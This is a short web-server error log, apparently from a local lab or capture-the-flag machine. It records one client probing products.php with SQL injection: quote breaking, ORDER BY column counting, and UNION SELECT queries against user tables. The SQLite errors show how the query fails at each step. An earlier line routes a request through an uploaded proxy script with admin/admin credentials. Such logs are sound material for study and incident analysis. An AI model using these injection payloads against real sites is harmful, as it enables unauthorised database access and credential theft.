2016/06/03 11:13:36 [error] 12#0: *15 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 152.123.11.232, server: localhost, request: "GET /uploads/prxy.php?mode=native&url=http://admin.nasa.gov.com/login.php?username=admin&pass=admin HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:13:54 [error] 12#0: *15 FastCGI sent in stderr: "PHP message: PHP Notice:  Undefined index: send_cookies in /var/www/uploads/uploads/prxy.php on line 167
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22%20UNION%201,%202,%203%20FROM%20users-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:23:41 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;&quot;1&quot;&quot;&quot; in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22 HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:23:57 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 3 in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22%20ORDER%20BY%204-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:24:19 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, no such table: user in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=1%22%20UNION%20SELECT%201,2,3%20FROM%20user-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:25:24 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, no such column: name in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=-1%22%20UNION%20SELECT%20*%20FROM%20users%20WHERE%20name=%22doctor%22-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"
2016/06/03 11:25:33 [error] 12#0: *29 FastCGI sent in stderr: "PHP message: PHP Warning:  SQLite3::query(): Unable to prepare statement: 1, no such column: user in /var/www/products.php on line 9
PHP message: PHP Fatal error:  Call to a member function fetchArray() on a non-object in /var/www/products.php on line 10" while reading response header from upstream, client: 177.143.65.198, server: localhost, request: "GET /products.php?id=-1%22%20UNION%20SELECT%20*%20FROM%20users%20WHERE%20user=%22doctor%22-- HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost:8888"


